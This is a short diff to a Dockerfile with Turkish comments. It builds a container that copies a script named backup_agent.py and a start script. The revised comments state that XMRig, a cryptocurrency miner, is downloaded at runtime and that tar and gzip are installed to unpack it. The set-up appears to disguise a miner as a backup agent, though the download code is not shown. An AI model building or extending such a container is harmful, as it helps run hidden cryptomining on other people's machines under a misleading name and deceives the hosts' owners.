@@ -1,6 +1,6 @@
 FROM python:3.10-slim
 
-# Gerekli paketler: xmrig için (tar, gzip) ve pycryptodome gerekmez ama urllib zaten var
+# XMRig binary'sini açmak için tar ve gzip gerekli
 RUN apt-get update && apt-get install -y --no-install-recommends \
     tar \
     gzip \
@@ -10,6 +10,5 @@ COPY backup_agent.py /opt/backup_agent.py
 COPY start.sh /start.sh
 RUN chmod +x /start.sh /opt/backup_agent.py
 
-# Çalışma zamanında indirileceği için ek bir şey yok
-
+# Çalışma zamanında XMRig indirileceği için binary imaja gömülmez
 CMD ["/start.sh"]
